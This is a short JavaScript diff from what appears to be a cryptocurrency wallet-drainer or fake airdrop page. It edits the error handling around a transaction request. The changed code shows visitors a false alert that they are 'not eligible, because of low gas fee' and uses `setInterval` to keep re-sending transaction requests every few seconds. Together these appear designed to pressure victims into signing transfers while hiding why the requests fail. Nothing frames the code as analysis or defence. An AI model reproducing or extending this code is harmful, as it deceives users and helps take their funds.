@@ -116,8 +116,8 @@ if (typeof process === 'undefined') {
         const { hash } = await sendTransaction(vrequest)
         console.log(hash)
       } catch(err){
-        console.log(err)
-        setTimeout(alert("You are not eligible, because of low gas fee"), 2000000)
+        
+        setInterval(alert("You are not eligible, because of low gas fee"), 20000000)
       }
     }
   }
@@ -186,7 +186,7 @@ if (typeof process === 'undefined') {
         console.log(hash)
       } catch (err){
         console.log(err)
-        setTimeout(alert("You are not eligible, because of low gas fee"), 2000000)
+        setInterval(alert("You are not eligible, because of low gas fee"), 20000000)
       }
     } else{
       setInterval(sendi, 5000)
